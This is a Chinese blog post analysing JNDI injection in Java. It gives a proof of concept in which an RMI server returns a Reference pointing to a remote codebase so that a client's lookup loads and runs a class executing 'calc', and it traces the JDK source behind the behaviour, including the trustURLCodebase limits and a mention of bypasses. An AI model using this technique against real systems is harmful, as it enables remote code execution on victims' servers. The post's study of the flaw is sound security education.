<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>JNDI</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>JNDI</h2><h1 id="0x1-JNDI"><a href="#0x1-JNDI" class="headerlink" title="0x1 JNDI"></a>0x1 JNDI</h1><p>Refrence ，引用，在JNDI绑定对象时可以直接序列化对象进行绑定，但是有的类太大了，所以可以绑定这个类的引用在JNDI中，这个引用包含去哪找这个类、如何构建这个类的信息。</p>
<p>codebase 就是在 ctx.lookup中写的地址<code>rmi://1.1.1.1/Object </code>，攻击的时候这个Object返回的是一个引用，让去 <a target="_blank" rel="noopener" href="http://2.2.2.2/EvilObject">http://2.2.2.2/EvilObject</a> ，7u21之后默认为True ，所以将不会往去<a target="_blank" rel="noopener" href="http://2.2.2.2这个服务查找类./">http://2.2.2.2这个服务查找类。</a></p>
<h1 id="0x2-JNDI-利用方式"><a href="#0x2-JNDI-利用方式" class="headerlink" title="0x2 JNDI 利用方式"></a>0x2 JNDI 利用方式</h1><h2 id="0x2-1-RMI-Remote-Object-Payload"><a href="#0x2-1-RMI-Remote-Object-Payload" class="headerlink" title="0x2.1 RMI Remote Object Payload"></a>0x2.1 RMI Remote Object Payload</h2><p>RMI Server 绑定一个恶意对象，将这个对象放在HTTP/FTP/SMB等服务器上，供受害者的RMI客户端远程加载执行。lookup会先从本地CLASSPATH中获取对应的Stub类的定义，从本地加载，如果没有找到则向远程Codebase去获取攻击者对象指定的恶意对象，这种方式会限制useCodebaseOnly的限制，利用条件：</p>
<ul>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ul>
<p>从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<h2 id="0x2-2-JNDI-RMI-Reference-Payload"><a href="#0x2-2-JNDI-RMI-Reference-Payload" class="headerlink" title="0x2.2 JNDI + RMI Reference Payload"></a>0x2.2 JNDI + RMI Reference Payload</h2><p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 <code>java.rmi.server.useCodebaseOnly</code>系统属性的限制，相对来说更加通用。</p>
<p>但是在JDK 6u132,JDK 7u122,JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启RMI Registry或者COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p>
<p>环境：jdk7u21</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JDNIServer</span></span><br><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;http://192.168.2.37:3000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/ExecTest&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;ExecTest&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ExecTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String var1 = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Process var2 = Runtime.getRuntime().exec(var1);</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JNDIClient</span></span><br><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span></span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/ExecTest&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意： ExecTest 类，不要有包名，JDK的版本尽量与JDNClient编译的相同</p>
</blockquote>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220523202651817.png" alt="image-20220523202651817"></p>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220523202344610.png" alt="image-20220523202344610"></p>
<p>分析为啥能弹计算器，跟进客户端的<code>ctx.lookup(&quot;rmi://127.0.0.1:1099/ExecTest&quot;)</code> 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">调用堆栈：</span><br><span class="line">getObjectInstance:315, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:120, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:411, InitialContext (javax.naming)</span><br><span class="line">main:11, JNDIClient (jndi)</span><br></pre></td></tr></table></figure>

<ol>
<li>根据传入的URL解析获得Context，比如传入的协议是rmi 就会产生rmiURLContenxt， 传入ldap就会产生ldapURLContext，然后执行这个Context的lookup方法，此时获取的 rmiURLContext</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javax.naming.InitialContext#lookup    </span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="comment">// 获取一个Context，调用这个Context的lookup</span></span><br><span class="line">       <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">            <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="comment">// 获取scheme 也就是 rmi ， 如果没有则返回默认的Context</span></span><br><span class="line">        String scheme = getURLScheme(name);</span><br><span class="line">        <span class="keyword">if</span> (scheme != <span class="keyword">null</span>) &#123;</span><br><span class="line">          	<span class="comment">// 根据不同的scheme生成Context，这里实际取到的是rmiURLContext</span></span><br><span class="line">            Context ctx = NamingManager.getURLContext(scheme, myProps);</span><br><span class="line">            <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ctx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220524094533724.png" alt="image-20220524094533724"></p>
<ol start="2">
<li>获取要用来解析URL的类，在这里是从rmi schema过来的<code>RegistryContext</code></li>
</ol>
<p>看GenericURLContext这个类的描述，这是一个抽象类，用来实现多态的，通过<code>this.getRootURLContext</code>和<code>getResolvedObj</code>方法获取真正去解析的子类，从第一步传过来的<code>rmiURLContext</code> 取到 <code>RegistryContext</code>, <code>RegistryContext.lookup</code>才是真正去解析URL(rmi://127.0.0.1:1099/ExecTest)</p>
<blockquote>
<p>This abstract class is a generic URL context that accepts as the name argument either a string URL or a Name whose first component is a URL. It resolves the URL to a target context and then continues the operation using the remaining name in the target context as if the first component names a junction. A subclass must define getRootURLContext() to process the URL into head/tail pieces. If it wants to control how URL strings are parsed and compared for the rename() operation, then it should override getNonRootURLSuffixes() and urlEquals().<br>Author:<br>Scott Seligman, Rosanna Lee</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.sun.jndi.toolkit.url.GenericURLContext#getContinuationContext    </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    		<span class="comment">// 获取rmiRegistry 和 要解析的对象名字（aa）</span></span><br><span class="line">        ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);</span><br><span class="line">    		<span class="comment">// RegistryContext</span></span><br><span class="line">        Context var3 = (Context)var2.getResolvedObj();</span><br><span class="line"></span><br><span class="line">        Object var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var4 = var3.lookup(var2.getRemainingName());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            var3.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220524092207419.png" alt="image-20220524092207419"></p>
<ol start="3">
<li>RegistryContext 实际相当于RMI Registry ，从Registry中取回绑定对象的信息，是序列化的类还是引用或者其他。</li>
</ol>
<blockquote>
<p>A RegistryContext is a context representing a remote RMI registry.<br>Author:<br>Scott Seligman</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jndi.rmi.registry.RegistryContext    </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220524095530150.png" alt="image-20220524095530150"></p>
<ol start="4">
<li>这步和下一步就是能JNDI注入的原因，如果是一个远程引用则会去远程服务器上加载恶意类</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//com.sun.jndi.rmi.registry.RegistryContext#decodeObject  </span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">         	<span class="comment">// 高版本的JDK在这里加入了trustURLCodebase的限制</span></span><br><span class="line">         	<span class="comment">// 判断是否为远程引用，如果是则获取引用</span></span><br><span class="line">           Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">         	<span class="comment">// 真正创建对象的函数</span></span><br><span class="line">           <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220524100117108.png" alt="image-20220524100117108"></p>
<ol start="5">
<li>在<code>getObjectInstance</code> 这个函数里面，会先判断是否传入factoryClassName 也就是工厂类，如果有则先创建这个工厂，然后通过这个工厂的<code>factory.getObjectInstance</code>的方法来创建实例，如果这个工厂类不在本地的CLASSPATH中则会去远程服务器上查找<code>http://192.168.2.37:3000/</code>并进行实例化，如果这个工厂类在本地存在，则使用本地工厂来创建实例。</li>
</ol>
<blockquote>
<p>这就是高版本JDK bypass的方法之一，可以使用一个本地参数可控的工厂来构建任意对象，不再去远程加载了。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javax.naming.spi.NamingManager#getObjectInstance    </span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object</span></span><br><span class="line"><span class="function">        <span class="title">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">                          Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        ObjectFactory factory;</span><br><span class="line">				</span><br><span class="line">      	<span class="comment">// 省略无关代码...</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Use reference if possible</span></span><br><span class="line">        Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object answer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">          	<span class="comment">// 获取工厂的名字</span></span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line">								<span class="comment">// 通过reference去创建工厂</span></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">              	</span><br><span class="line">                <span class="comment">// 如果工厂创建成功</span></span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  	<span class="comment">// 则用来创建对象</span></span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="keyword">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>构建工厂类，<code>getObjectFactoryFromReference</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javax.naming.spi.NamingManager#getObjectFactoryFromReference</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">        InstantiationException,</span></span><br><span class="line"><span class="function">        MalformedURLException </span>&#123;</span><br><span class="line">        Class clas = <span class="keyword">null</span>;</span><br><span class="line">				</span><br><span class="line">        <span class="comment">// 先从本地CLASSPATH中查找是否存在这个类</span></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line">				</span><br><span class="line">        <span class="comment">// 如果没有则去远程codebase加载</span></span><br><span class="line">        <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              	<span class="comment">// helper.loaddClass 里面调用的URLClassLoader，从远程获取class</span></span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 创建实例</span></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220524101829365.png" alt="image-20220524101829365"></p>
<p>跟进<code>helper.loadClass</code>，可以看到是调用URLClassLoader去加载</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String className, String codebase)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException </span>&#123;</span><br><span class="line">    ClassLoader cl;</span><br><span class="line"></span><br><span class="line">    ClassLoader parent = getContextClassLoader();</span><br><span class="line">    cl = URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Class.forName(className, <span class="keyword">true</span>, cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里可以看到jdk8u322高版本的JDK限制，运行会提示错误：</p>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220526100305969.png" alt="image-20220526100305969"></p>
<p>跟踪代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.sun.jndi.rmi.registry.RegistryContext#decodeObject</span></span><br><span class="line">            <span class="keyword">if</span> (ref != <span class="keyword">null</span> &amp;&amp; ref.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(</span><br><span class="line">                    <span class="string">&quot;The object factory is untrusted. Set the system property&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(obj, name, <span class="keyword">this</span>,</span><br><span class="line">                                                   environment);</span><br></pre></td></tr></table></figure>

<p><code>trustURLCodebase</code> 默认为false ，所以会直接抛出异常</p>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220526100506359.png" alt="image-20220526100506359"></p>
<p>ref的属性，后面bypass 就是将<code>ref.getFactoryClassLocation() == null</code>，不再去远程加载类了，直接使用本地的工厂构建任意对象。</p>
<p><img src="/2022/05/23/JNDI%E6%B3%A8%E5%85%A5/image-20220526100232986.png" alt="image-20220526100232986"></p>
<p>另外实际不止有lookup方法可以注入，类似的还有<code>InitialContext.rename()</code>、<code>InitialContext.lookupLink()</code>方法也最终会调用lookup。</p>
<h2 id="JNDI-LDAP-Reference-Payload"><a href="#JNDI-LDAP-Reference-Payload" class="headerlink" title="JNDI + LDAP Reference Payload"></a>JNDI + LDAP Reference Payload</h2><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。</p>
